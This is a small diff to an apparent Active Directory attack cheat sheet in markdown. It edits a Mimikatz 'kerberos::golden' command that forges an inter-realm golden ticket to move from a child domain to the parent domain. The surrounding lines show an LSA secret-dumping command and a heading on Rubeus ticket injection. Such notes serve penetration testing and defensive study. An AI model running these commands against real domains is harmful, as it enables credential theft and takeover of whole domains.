@@ -435,8 +435,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 #### Create an inter-realm TGT
 - Uses well know Enterprise Admins SIDS
 ```
-Invoke-Mimikatz -Command '"Kerberos::golden /domain:<FQDN CHILD DOMAIN> /user:Administrator /rc4:<TRUST KEY HASH> /sid:<SID CHILD DOMAIN> /sids:S-1-5-21-2781415573-
-3701854478-2406986946-519 /service:krbtgt /target:<FQDN PAARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
 ```
 
 #### Create a TGS using Rubeus and inject current Powershell session
